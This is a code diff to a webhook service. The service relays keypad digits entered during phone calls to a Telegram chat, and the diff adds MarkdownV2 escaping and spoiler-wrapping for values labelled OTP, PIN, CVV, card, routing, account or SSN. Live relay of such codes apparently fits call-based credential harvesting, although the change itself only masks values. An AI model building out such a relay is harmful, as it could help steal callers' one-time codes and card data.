@@ -249,6 +249,60 @@ class EnhancedWebhookService {
     });
   }
 
+  escapeMarkdownV2PreservingSpoilers(text = '') {
+    const source = String(text || '');
+    if (!source) return source;
+    const segments = source.split(/(\|\|[\s\S]*?\|\|)/g);
+    return segments
+      .filter((segment) => segment !== '')
+      .map((segment) => {
+        if (segment.startsWith('||') && segment.endsWith('||')) {
+          const inner = segment.slice(2, -2);
+          return `||${escapeMarkdownV2(inner)}||`;
+        }
+        return escapeMarkdownV2(segment);
+      })
+      .join('');
+  }
+
+  isRawDigitValueForSpoiler(value = '') {
+    const raw = String(value || '').trim();
+    if (!raw || raw.toLowerCase() === 'none') return false;
+    const unwrapped = raw.startsWith('||') && raw.endsWith('||')
+      ? raw.slice(2, -2).trim()
+      : raw;
+    if (!unwrapped) return false;
+    if (unwrapped.startsWith('vault://digits/') || unwrapped.startsWith('tok_')) return false;
+    if (unwrapped.includes('*') || unwrapped.includes('•')) return false;
+    const digitCount = unwrapped.replace(/\D/g, '').length;
+    if (digitCount >= 2) return true;
+    return false;
+  }
+
+  wrapLiveDigitValueWithSpoiler(line = '') {
+    const source = String(line || '').trim();
+    if (!source) return source;
+    const digitContext = /\b(otp|pin|cvv|zip|routing|account|card|expiry|ssn|dob|phone|tax id|ein|claim|reservation|ticket|case|callback|digits?|keypad)\b/i;
+    if (!digitContext.test(source) || !source.includes(':')) return source;
+
+    const lastColon = source.lastIndexOf(':');
+    if (lastColon < 0 || lastColon === source.length - 1) return source;
+
+    const head = source.slice(0, lastColon + 1);
+    const tail = source.slice(lastColon + 1).trim();
+    if (!tail) return source;
+
+    const match = tail.match(/^(.+?)(\s+\([^)]*\))?$/);
+    if (!match) return source;
+
+    const value = String(match[1] || '').trim();
+    const suffix = String(match[2] || '');
+    if (!this.isRawDigitValueForSpoiler(value)) return source;
+    if (value.startsWith('||') && value.endsWith('||')) return source;
+
+    return `${head} ||${value}||${suffix}`;
+  }
+
   buildDigitSummaryFromEvents(events = [], options = {}) {
     if (!Array.isArray(events) || events.length === 0) {
       return '';
@@ -259,7 +313,7 @@ class EnhancedWebhookService {
     const formatValue = (value) => {
       const raw = value === undefined || value === null || value === '' ? 'none' : String(value);
       const escaped = useEscape ? escapeMarkdownV2(raw) : raw;
-      if (useSpoiler && raw !== 'none') {
+      if (useSpoiler && this.isRawDigitValueForSpoiler(raw)) {
         return `||${escaped}||`;
       }
       return escaped;
@@ -805,7 +859,7 @@ class EnhancedWebhookService {
             let digitSummary = '';
             if (this.db?.getCallDigits) {
               const events = await this.db.getCallDigits(call_sid).catch(() => []);
-              digitSummary = this.buildDigitSummaryFromEvents(events, { spoiler: false, escape: true });
+              digitSummary = this.buildDigitSummaryFromEvents(events, { spoiler: true, escape: true });
             }
             if (digitSummary) {
               const header = escapeMarkdownV2(message);
@@ -1546,8 +1600,12 @@ class EnhancedWebhookService {
     }
 
     const text = this.buildLiveConsoleMessage(entry);
+    const escapedText = this.escapeMarkdownV2PreservingSpoilers(text);
     const initialMarkup = this.consoleButtons(callSid, entry);
-    const response = await this.sendTelegramMessage(chatId, text, false, { replyMarkup: initialMarkup });
+    const response = await this.sendTelegramMessage(chatId, escapedText, false, {
+      replyMarkup: initialMarkup,
+      parseMode: 'MarkdownV2'
+    });
     entry.messageId = response?.result?.message_id;
     entry.lastEditAt = new Date();
     entry.lastMessageText = text;
@@ -2043,7 +2101,8 @@ class EnhancedWebhookService {
     const entry = this.liveConsoleByCallSid.get(callSid);
     if (!entry) return;
     this.markCallActivity(callSid);
-    const line = this.resolveTokenizedText(callSid, String(eventLine || '').trim());
+    const resolved = this.resolveTokenizedText(callSid, String(eventLine || '').trim());
+    const line = this.wrapLiveDigitValueWithSpoiler(resolved);
     if (!line) return;
     entry.lastEvents.push(line);
     const maxEvents = Number.isFinite(entry.maxEvents) ? entry.maxEvents : this.liveConsoleMaxEvents;
@@ -2128,13 +2187,16 @@ class EnhancedWebhookService {
     if (!entry || !entry.messageId) return;
     entry.lastEditAt = new Date();
     const text = this.buildLiveConsoleMessage(entry);
+    const escapedText = this.escapeMarkdownV2PreservingSpoilers(text);
     const markup = this.consoleButtons(callSid, entry);
     const markupKey = JSON.stringify(markup || {});
     if (text === entry.lastMessageText && markupKey === entry.lastMarkup) {
       return;
     }
     try {
-      await this.editTelegramMessage(entry.chatId, entry.messageId, text, false, markup);
+      await this.editTelegramMessage(entry.chatId, entry.messageId, escapedText, false, markup, {
+        parseMode: 'MarkdownV2'
+      });
       entry.lastMessageText = text;
       entry.lastMarkup = markupKey;
     } catch (error) {
